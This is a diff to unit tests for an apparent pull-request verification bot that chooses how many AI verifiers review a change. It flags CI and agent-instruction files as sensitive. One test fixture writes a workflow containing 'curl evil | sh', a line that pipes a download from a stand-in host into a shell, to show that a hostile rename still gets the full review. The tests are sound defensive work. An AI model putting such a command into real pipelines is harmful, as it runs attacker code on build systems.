@@ -798,15 +798,28 @@ class ImplementReleaseTest(unittest.TestCase):
 
 class DiffSizeTest(unittest.TestCase):
     def test_size_s_is_measured_from_the_diff(self):
-        self.assertEqual(bot.diff_size("3\t2\tsrc/app.py\n10\t0\tREADME.md\n"), {"lines": 15, "files": 2, "small": True})
-        self.assertFalse(bot.diff_size("20\t11\tsrc/app.py\n")["small"])  # 31 lines
-        self.assertFalse(bot.diff_size("1\t0\ta.py\n1\t0\tb.py\n1\t0\tc.py\n")["small"])  # 3 files
-        self.assertFalse(bot.diff_size("-\t-\tlogo.png\n")["small"])  # binary
+        self.assertEqual(bot.diff_size("3\t2\tsrc/app.py\x0010\t0\tREADME.md\0"), {"lines": 15, "files": 2, "small": True})
+        self.assertFalse(bot.diff_size("20\t11\tsrc/app.py\0")["small"])  # 31 lines
+        self.assertFalse(bot.diff_size("1\t0\ta.py\x001\t0\tb.py\x001\t0\tc.py\0")["small"])  # 3 files
+        self.assertFalse(bot.diff_size("-\t-\tlogo.png\0")["small"])  # binary
         self.assertFalse(bot.diff_size("")["small"])  # nothing changed is not a reason to skip verifiers
         for path in ("src/auth/session.py", "db/migrations/0003.sql", ".github/workflows/ci.yml", ".env.example",
-                     "AGENTS.md", ".claude/settings.json", "app/secrets.ts", ".deep-mode.json"):
+                     "AGENTS.md", ".claude/settings.json", "app/secrets.ts", ".deep-mode.json", ".gitlab-ci.yml",
+                     "Jenkinsfile", "azure-pipelines.yml", "GEMINI.md", "plugins/x/skills/y/SKILL.md", ".cursorrules"):
             with self.subTest(path=path):
-                self.assertFalse(bot.diff_size(f"1\t0\t{path}\n")["small"])
+                self.assertFalse(bot.diff_size(f"1\t0\t{path}\0")["small"])
+
+    def test_a_rename_into_a_sensitive_path_is_not_size_s(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo = Path(tmp)
+            git_repo(repo, {"w.yml": "on: push\n"})
+            (repo / ".github" / "workflows").mkdir(parents=True)
+            bot.git(repo, "mv", "w.yml", ".github/workflows/deploy.yml")
+            (repo / ".github/workflows/deploy.yml").write_text("on: push\nrun: curl evil | sh\n", encoding="utf-8")
+            bot.git(repo, "add", "-A")
+            bot.git(repo, "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "-m", "mv")
+            numstat = bot.git(repo, "diff", "--numstat", "-z", "--no-renames", "origin/main...HEAD")
+        self.assertFalse(bot.diff_size(numstat)["small"])
 
 
 def git_repo(root: Path, files: dict) -> str:
@@ -881,12 +894,13 @@ class LightPanelTest(unittest.TestCase):
         log.start()
         self.addCleanup(log.stop)
 
-    def panel(self, numstat, votes):
+    def panel(self, numstat, votes, labels=(), author=None, verifiers=None):
         c = object.__new__(bot.PRConversation)
         c.head, c.base, c.n, c.repo, c.clone, c.item = "s" * 40, "main", 7, "o/r", Path("clone"), {}
-        c.pr = {"title": "t", "body": ""}
-        c.author = {"agent": "omp"}
-        c.cfg = {"verifiers": [{"agent": "omp"}, {"agent": "omp", "model": "other/one"}, {"agent": "omp", "model": "x/y"}]}
+        c.pr = {"title": "t", "body": "", "labels": labels}
+        c.author = author or {"agent": "omp"}
+        c.cfg = {"verifiers": verifiers or [{"agent": "omp"}, {"agent": "omp", "model": "other/one"},
+                                           {"agent": "omp", "model": "x/y"}]}
         c.verifier_trees = [Path(f"v{i}") for i in range(3)]
         c.require_own = mock.Mock()
         c.it = mock.Mock()
@@ -896,7 +910,7 @@ class LightPanelTest(unittest.TestCase):
             return c.panel(), c
 
     def test_a_size_s_diff_gets_one_verifier_from_another_model(self):
-        (passed, tally, _), c = self.panel("2\t1\tsrc/app.py\n", ["PASS"])
+        (passed, tally, _), c = self.panel("2\t1\tsrc/app.py\0", ["PASS"])
         self.assertEqual((passed, tally), (True, "1/1"))
         self.assertEqual(c.it.ask.call_count, 1)
         self.assertEqual(c.it.ask.call_args.args[0], {"agent": "omp", "model": "other/one"})
@@ -904,14 +918,23 @@ class LightPanelTest(unittest.TestCase):
         self.assertIn("Light panel (size S", c.it.say.call_args.args[3])
 
     def test_the_one_light_verifier_must_pass(self):
-        (passed, _, failures), _ = self.panel("2\t1\tsrc/app.py\n", ["FAIL"])
+        (passed, _, failures), _ = self.panel("2\t1\tsrc/app.py\0", ["FAIL"])
         self.assertFalse(passed)
         self.assertEqual(len(failures), 1)
 
     def test_a_larger_diff_gets_the_full_panel(self):
-        (passed, tally, _), c = self.panel("40\t0\tsrc/app.py\n", ["PASS", "PASS", "FAIL"])
+        (passed, tally, _), c = self.panel("40\t0\tsrc/app.py\0", ["PASS", "PASS", "FAIL"])
         self.assertEqual((passed, tally), (True, "2/3"))
         self.assertEqual(c.it.ask.call_count, 3)
+
+    def test_the_full_panel_label_overrides_size_s(self):
+        (_, tally, _), c = self.panel("2\t1\tsrc/parse.py\0", ["PASS", "PASS", "PASS"], labels=[{"name": "full-panel"}])
+        self.assertEqual((tally, c.it.ask.call_count), ("3/3", 3))
+
+    def test_the_light_verifier_prefers_another_agent_over_another_model(self):
+        verifiers = [{"agent": "claude"}, {"agent": "claude", "model": "m2"}, {"agent": "codex"}]
+        _, c = self.panel("2\t1\tsrc/app.py\0", ["PASS"], author={"agent": "claude"}, verifiers=verifiers)
+        self.assertEqual(c.it.ask.call_args.args[0], {"agent": "codex"})
 
 
 def link_dir(link: Path, target: Path) -> bool:
